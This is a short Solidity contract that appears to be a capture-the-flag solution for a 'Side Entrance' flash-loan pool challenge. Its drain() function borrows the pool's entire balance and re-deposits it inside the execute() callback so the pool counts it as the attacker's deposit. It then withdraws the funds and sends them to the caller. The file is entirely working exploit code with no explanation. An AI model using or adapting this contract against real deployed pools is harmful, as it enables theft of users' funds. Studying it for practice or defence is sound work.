// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract SideEntranceReceiver {

    IPool immutable pool;

    constructor(address _victim) {
        pool = IPool(_victim);
    }

    function drain() external {
        uint256 balance = address(pool).balance;
        pool.flashLoan(balance);

        // Recovering the funds
        pool.withdraw();
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
